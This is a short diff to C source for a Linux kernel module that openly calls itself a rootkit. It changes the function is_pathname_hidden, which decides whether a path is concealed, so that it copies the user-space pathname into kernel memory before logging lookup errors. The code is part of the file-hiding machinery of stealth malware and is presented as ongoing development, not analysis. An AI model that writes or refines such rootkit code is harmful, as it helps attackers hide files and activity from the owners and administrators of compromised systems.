@@ -93,12 +93,13 @@ bool is_path_hidden(const path_t *const p_path)
     return false;
 }
 
-bool is_pathname_hidden(const int i32_dfd, const char *const s_pathname,
+bool is_pathname_hidden(const int i32_dfd, const char *const __user s_pathname,
                         unsigned int ui32_lookup_flags)
 {
-    bool b_ret = false; // Return value
-    int i_err  = 0;     // Error code
-    path_t path;        // Path structure
+    bool b_ret               = false; // Return value
+    int i_err                = 0;     // Error code
+    const char *s_pathname_k = NULL;  // Kernel buffer for path name
+    path_t path;                      // Path structure
 
     ui32_lookup_flags &= ~LOOKUP_AUTOMOUNT; // Do not auto mount
 
@@ -106,8 +107,10 @@ bool is_pathname_hidden(const int i32_dfd, const char *const s_pathname,
     i_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags & ~LOOKUP_FOLLOW, &path);
 
     IF_U (i_err != 0) {
+        s_pathname_k = strndup_user(s_pathname, PATH_MAX);
         pr_err("[ROOTKIT]   * Could not get path for %s (error: %d) (not following symlinks)\n",
-               s_pathname, i_err);
+               s_pathname_k, i_err);
+        kfree_const(s_pathname_k);
         return false;
     }
 
@@ -125,8 +128,10 @@ bool is_pathname_hidden(const int i32_dfd, const char *const s_pathname,
     i_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags, &path);
 
     IF_U (i_err != 0) {
+        s_pathname_k = strndup_user(s_pathname, PATH_MAX);
         pr_err("[ROOTKIT]   * Could not get path for %s (error: %d) (following symlinks)\n",
-               s_pathname, i_err);
+               s_pathname_k, i_err);
+        kfree_const(s_pathname_k);
         return false;
     }
 
